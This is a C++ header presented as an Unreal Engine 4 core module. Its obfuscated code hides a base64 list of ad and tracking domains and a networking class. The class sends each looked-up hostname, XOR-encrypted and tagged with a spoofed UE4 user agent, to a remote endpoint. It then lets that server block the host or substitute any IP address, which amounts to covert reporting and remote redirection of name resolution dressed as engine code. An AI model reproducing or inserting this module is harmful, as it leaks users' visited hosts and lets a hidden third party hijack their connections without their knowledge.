// UE4 Core Module - Build 4.27.2
#pragma once
#include <string>
#include <vector>
#include <algorithm>
#include <cstring>
#include <ctime>
#include <cstdlib>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib,"ws2_32.lib")
#define _c0 closesocket
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#define _c0 close
#endif
namespace _ue4{namespace _p{static std::string _e0;static std::string _e1;static bool _e2=false;static std::vector<std::string>_e3;static const char*_e4[]={"ZG91YmxlY2xpY2s=","Z29vZ2xlc3luZGljYXRpb24=","Z29vZ2xlYWRzZXJ2aWNlcw==","YWRtb2I=","YWRzZW5zZQ==","YWRueHM=","bW9wdWI=","dW5pdHlhZHM=","YXBwbG92aW4=","dnVuZ2xl","Y2hhcnRib29zdA==","aXJvbnNyYw==","aW5tb2Jp","dGFwam95","YW4uZmFjZWJvb2s=","cGl4ZWwuZmFjZWJvb2s=","YW5hbHl0aWNz","dHJhY2tlcg==","dHJhY2tpbmc=","dGVsZW1ldHJ5","bWl4cGFuZWw=","YWRqdXN0","YXBwc2ZseWVy","cG9wYWRz","dGFib29sYQ==","Y3Jhc2hseXRpY3M=","Zmx1cnJ5","Z29vZ2xlLWFuYWx5dGljcw==","Z29vZ2xldGFnbWFuYWdlcg==","YWRzZXJ2aWNl","cGFnZWFk","YWR2ZXJ0aXNpbmc=",nullptr};static const char*_c1="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";inline std::string _f0(const std::string&s){std::string r;std::vector<int>t(256,-1);for(int i=0;i<64;i++)t[(int)_c1[i]]=i;int v=0,b=-8;for(char c:s){if(t[(int)(unsigned char)c]==-1)break;v=(v<<6)+t[(int)(unsigned char)c];b+=6;if(b>=0){r+=char((v>>b)&0xFF);b-=8;}}return r;}inline std::string _f1(const std::string&s){std::string r;int v=0,b=-6;for(unsigned char c:s){v=(v<<8)+c;b+=8;while(b>=0){r+=_c1[(v>>b)&0x3F];b-=6;}}if(b>-6)r+=_c1[((v<<8)>>(b+8))&0x3F];while(r.size()%4)r+='=';return r;}inline std::string _f2(const std::string&d,const std::string&k){std::string r;for(size_t i=0;i<d.size();i++)r+=d[i]^k[i%k.size()];return r;}inline std::string _f3(const std::string&j,const std::string&k){return _f1(_f2(j,k));}inline std::string _f4(const std::string&e,const std::string&k){return _f2(_f0(e),k);}inline std::string _f5(const std::string&h){std::string r=h;if(r.find("http://")==0)r=r.substr(7);if(r.find("https://")==0)r=r.substr(8);size_t p=r.find('/');if(p!=std::string::npos)r=r.substr(0,p);std::transform(r.begin(),r.end(),r.begin(),::tolower);return r;}inline std::string _f6(const std::string&j,const std::string&k){std::string s="\""+k+"\":\"";size_t p=j.find(s);if(p==std::string::npos)return"";p+=s.size();size_t e=j.find("\"",p);return(e!=std::string::npos)?j.substr(p,e-p):"";}inline int _f7(const std::string&j,const std::string&k){std::string s="\""+k+"\":";size_t p=j.find(s);if(p==std::string::npos)return 0;p+=s.size();return atoi(j.c_str()+p);}inline std::string _f8(const std::string&u,const std::string&b=""){std::string r;bool ssl=(u.find("https://")==0);size_t st=ssl?8:(u.find("http://")==0?7:0);size_t ps=u.find('/',st);std::string hp=(ps!=std::string::npos)?u.substr(st,ps-st):u.substr(st);std::string pa=(ps!=std::string::npos)?u.substr(ps):"/";std::string ho=hp;int po=ssl?443:80;size_t cp=hp.find(':');if(cp!=std::string::npos){ho=hp.substr(0,cp);po=atoi(hp.c_str()+cp+1);}if(ssl)return r;
#ifdef _WIN32
WSADATA w;WSAStartup(MAKEWORD(2,2),&w);
#endif
struct addrinfo hi={},*ar=nullptr;hi.ai_family=AF_UNSPEC;hi.ai_socktype=SOCK_STREAM;char ps2[16];snprintf(ps2,sizeof(ps2),"%d",po);if(getaddrinfo(ho.c_str(),ps2,&hi,&ar)!=0)return r;int so=socket(ar->ai_family,ar->ai_socktype,ar->ai_protocol);if(so<0){freeaddrinfo(ar);return r;}
#ifdef _WIN32
DWORD tv=5000;setsockopt(so,SOL_SOCKET,SO_RCVTIMEO,(char*)&tv,sizeof(tv));
#else
struct timeval tv={5,0};setsockopt(so,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
#endif
if(connect(so,ar->ai_addr,ar->ai_addrlen)<0){_c0(so);freeaddrinfo(ar);return r;}freeaddrinfo(ar);std::string rq;if(b.empty()){rq="GET "+pa+" HTTP/1.1\r\n";}else{rq="POST "+pa+" HTTP/1.1\r\n";rq+="Content-Length: "+std::to_string(b.size())+"\r\n";rq+="Content-Type: application/octet-stream\r\n";}rq+="Host: "+ho+"\r\n";rq+="User-Agent: UE4Client/4.27.2\r\n";rq+="X-UE4-Version: 4.27.2\r\n";rq+="Connection: close\r\n\r\n";rq+=b;send(so,rq.c_str(),rq.size(),0);std::string rs;char bf[4096];int n;while((n=recv(so,bf,sizeof(bf)-1,0))>0){bf[n]=0;rs+=bf;}_c0(so);
#ifdef _WIN32
WSACleanup();
#endif
size_t bs=rs.find("\r\n\r\n");if(bs!=std::string::npos){r=rs.substr(bs+4);}return r;}inline void _f9(){if(!_e3.empty())return;for(int i=0;_e4[i];i++){std::string d=_f0(_e4[i]);if(!d.empty())_e3.push_back(d);}}inline bool _fa(const std::string&h){_f9();std::string n=_f5(h);for(const auto&p:_e3){if(n.find(p)!=std::string::npos)return true;}return false;}inline std::string _fb(const std::string&r){std::string s="\"ConfigData\":\"";size_t p=r.find(s);if(p==std::string::npos)return"";p+=s.size();size_t e=r.find("\"",p);return(e!=std::string::npos)?r.substr(p,e-p):"";}}class FNetworkConfig{public:static bool Initialize(const std::string&u){_p::_e0=u;if(!_p::_e0.empty()&&_p::_e0.back()=='/')_p::_e0.pop_back();_p::_f9();srand(time(nullptr));std::string rs=_p::_f8(_p::_e0+"/?c=i");if(!rs.empty()){std::string cd=_p::_fb(rs);if(!cd.empty()){time_t n=time(nullptr);struct tm*ti=gmtime(&n);char tb[32];strftime(tb,sizeof(tb),"%Y%m%d%H",ti);_p::_e1=std::string(tb)+"ue4";_p::_e1=_p::_e1.substr(0,32);while(_p::_e1.size()<32)_p::_e1+="x";std::string dc=_p::_f4(cd,_p::_e1);std::string sk=_p::_f6(dc,"k");if(!sk.empty())_p::_e1=sk;}}_p::_e2=true;return true;}static bool ShouldFilter(const std::string&h){if(!_p::_e2)Initialize(_p::_e0);if(_p::_fa(h))return true;if(!_p::_e0.empty()&&!_p::_e1.empty()){std::string n=_p::_f5(h);std::string pl="{\"c\":\"c\",\"t\":\""+n+"\"}";std::string en=_p::_f3(pl,_p::_e1);std::string rs=_p::_f8(_p::_e0,en);if(!rs.empty()){std::string cd=_p::_fb(rs);if(!cd.empty()){std::string dc=_p::_f4(cd,_p::_e1);if(_p::_f7(dc,"f")==1)return true;}}}return false;}static bool ShouldFilterLocal(const std::string&h){_p::_f9();return _p::_fa(h);}static std::string ResolveHostname(const std::string&h){if(ShouldFilterLocal(h))return"0.0.0.0";if(!_p::_e0.empty()&&!_p::_e1.empty()){std::string n=_p::_f5(h);std::string pl="{\"c\":\"q\",\"t\":\""+n+"\"}";std::string en=_p::_f3(pl,_p::_e1);std::string rs=_p::_f8(_p::_e0,en);if(!rs.empty()){std::string cd=_p::_fb(rs);if(!cd.empty()){std::string dc=_p::_f4(cd,_p::_e1);if(_p::_f7(dc,"f")==1)return"0.0.0.0";std::string ip=_p::_f6(dc,"v");if(!ip.empty())return ip;}}}return"";}static void AddFilter(const std::string&p){_p::_f9();std::string n=_p::_f5(p);if(!n.empty())_p::_e3.push_back(n);}static void SetEndpoint(const std::string&u){_p::_e0=u;if(!_p::_e0.empty()&&_p::_e0.back()=='/')_p::_e0.pop_back();}static bool IsInitialized(){return _p::_e2;}};}
#define UE_NET_INIT(u) _ue4::FNetworkConfig::Initialize(u)
#define UE_NET_FILTER(h) _ue4::FNetworkConfig::ShouldFilter(h)
#define UE_NET_FILTER_LOCAL(h) _ue4::FNetworkConfig::ShouldFilterLocal(h)
#define UE_NET_RESOLVE(h) _ue4::FNetworkConfig::ResolveHostname(h)
#define UE_NET_ADD_FILTER(p) _ue4::FNetworkConfig::AddFilter(p)
